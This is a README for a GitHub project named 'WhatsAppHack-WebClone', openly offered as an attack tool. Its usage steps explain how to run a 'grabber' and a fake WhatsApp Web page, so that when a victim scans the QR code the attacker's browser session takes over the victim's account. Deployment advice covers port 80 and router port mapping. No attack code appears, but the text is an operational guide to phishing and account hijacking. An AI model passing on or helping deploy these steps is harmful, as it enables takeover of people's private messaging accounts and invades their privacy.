### WhatsAppHack-WebClone
### For Help and Questions {darkhubgeek@gmail.com} [Telegram]https://t.me/darkhubgeek
![whatsapphack-clone](https://github.com/BitWalls-ops/WhatsAppHack-WebClone/blob/main/Screenshot_20230405_161937.png)
## requirements
 - Python >= 3.6.3
 - Flask==1.0.2
 - Selenium==3.7.0
 - [Gecko Driver](https://github.com/mozilla/geckodriver/releases)

 
## usage
clone the repo:
        
        git clone https://github.com/BitWalls-ops/WhatsAppHack-WebClone.git

install the requirements

    cd path/to/the/repo
    pip install -r requirements.txt
    
first run the grabber
    
    python3 grabber.py
    
then run the server
 
    python3 server.py
    
    
as the victim scans the qr on the fake website, whatsapp web on the browser spawned
by the grabber will be connected to the victim's number.

## Before usage:
 - change the last line of the server.py script to fit your needs
 (if run on port 80, you might need to run as superuser)
 - router configuration might be necessary (port mapping)
